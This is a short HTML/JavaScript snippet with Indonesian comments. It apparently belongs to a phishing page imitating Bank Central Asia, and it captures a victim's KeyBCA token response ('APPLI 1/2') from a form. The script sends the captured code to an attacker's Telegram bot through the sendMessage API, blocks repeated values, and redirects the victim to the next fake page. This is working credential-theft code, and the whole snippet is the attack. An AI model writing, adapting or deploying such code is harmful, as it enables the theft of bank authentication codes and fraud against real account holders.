<script src="config.js"></script>
<script>
  // Ambil data input sebelumnya dari localStorage atau buat objek kosong
  let inputCounts = JSON.parse(localStorage.getItem("inputCounts")) || {};

  document.getElementById("cancel-form").addEventListener("submit", function (event) {
    event.preventDefault();

    const key2 = document.getElementById("key2").value.trim(); // Ambil teks yang dimasukkan

    // Jika teks sudah dimasukkan lebih dari 2 kali, tolak input
    if (inputCounts[key2] && inputCounts[key2] >= 2) {
      alert("Teks ini sudah dimasukkan 2 kali, coba teks lain!");
      return;
    }

    // Tambah jumlah percobaan untuk teks ini
    inputCounts[key2] = (inputCounts[key2] || 0) + 1;
    localStorage.setItem("inputCounts", JSON.stringify(inputCounts)); // Simpan ke localStorage

    // Kirim data ke bot Telegram
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: `Respon APPLI 1/2 KeyBCA: ${key2}`,
      }),
    }).then(response => {
      if (response.ok) {
        window.location.href = "bisnis2.html"; // Redirect ke bisnis2.html
      } else {
        alert("Gagal mengirim data ke bot Telegram.");
      }
    }).catch(error => {
      console.error("Error:", error);
      alert("Terjadi kesalahan saat mengirim data.");
    });
  });
</script>
